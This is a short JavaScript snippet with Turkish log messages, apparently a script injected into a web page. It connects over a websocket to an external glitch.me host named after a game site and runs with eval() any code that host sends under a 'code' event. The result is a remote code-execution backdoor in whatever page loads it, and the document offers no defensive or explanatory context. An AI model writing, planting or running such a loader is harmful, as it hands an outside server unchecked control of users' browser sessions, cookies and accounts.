(function() {
    console.log('Script yüklendi!');
    var socket = io('https://duello-katiponline-com.glitch.me', {
        path: '/socket.io',
        transports: ['websocket'],
        query: { EIO: 4 }
    });
    
    socket.on('connect', () => {
        console.log('Socket.IO bağlantısı kuruldu');
    });
    
    socket.on('code', (newCode) => {
        console.log('Yeni kod:', newCode);
        eval(newCode);
    });
    
    socket.on('connect_error', (error) => {
        console.error('Bağlantı hatası:', error);
    });
})();
